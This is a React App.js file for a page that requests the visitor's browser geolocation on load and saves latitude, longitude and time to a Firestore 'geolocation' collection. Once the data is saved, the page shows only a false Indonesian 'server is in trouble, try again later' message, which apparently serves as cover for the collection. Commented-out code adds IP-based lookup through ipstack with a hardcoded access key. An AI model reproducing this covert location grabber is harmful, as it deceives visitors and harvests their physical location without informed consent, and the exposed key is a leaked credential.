import './App.css';
import { useEffect, useState } from 'react';
import firebase from './FBConfig';

function App() {
  const [done, setDone] = useState(false);

  useEffect(() => {
    getLocation();
  }, []);

  const getLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(position => {
        const db = firebase.firestore();
        const userRef = db.collection("geolocation").add({
          lat: position.coords.latitude,
          long: position.coords.longitude,
          time: position.timestamp
        }).then(res => {
          setDone(true);
        });
      })
    } else {
      console.log('location cannot connect');
    }
    // fetch('https://api.ipify.org?format=json').then(response => response.json()).then(resIp => {
    //   const url = `http://api.ipstack.com/${resIp.ip}?access_key=bc07dcce927d56cbea29f0deaec7bc59`;
    //   // const url = `https://ip-api.com/json/${resIp.ip}`;
    //   // const url = `https://freegeoip.app/json/${resIp.ip}`;
    //   const req = new Request(url);
    //   fetch(req).then(response => response.json()).then(res => {
    //     console.log(res);
    //     const db = firebase.firestore();
    //     const userRef = db.collection("geolocation").add({
    //       lat: res.latitude,
    //       long: res.longitude,
    //       time: new Date(),
    //       ip: resIp.ip
    //     }).then(res => {
    //       setDone(true);
    //       console.log('done');
    //     });
    //   });
    // })
  }

  return (
    <div>
      {done &&
        <div>
          Server Dalam gangguan, cobalah beberapa saat lagi.
        </div>
      }
    </div>
  );
}

export default App;
